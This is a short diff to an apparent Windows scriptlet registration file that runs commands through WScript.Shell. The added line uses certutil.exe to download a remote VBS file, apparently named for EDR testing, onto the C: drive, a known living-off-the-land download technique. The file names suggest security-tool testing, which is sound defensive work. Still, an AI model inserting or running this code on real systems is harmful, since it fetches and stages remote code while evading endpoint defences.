@@ -6,6 +6,7 @@
 	<script language="JScript">
 		<![CDATA[
 			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+			var r = new ActiveXObject("WScript.Shell").Run("certutil.exe -urlcache -split -f https://raw.githubusercontent.com/scriptsample/mal/master/edrtest.vbs c:\edrtest.vbs”);
 		]]>
 </script>
 </registration>
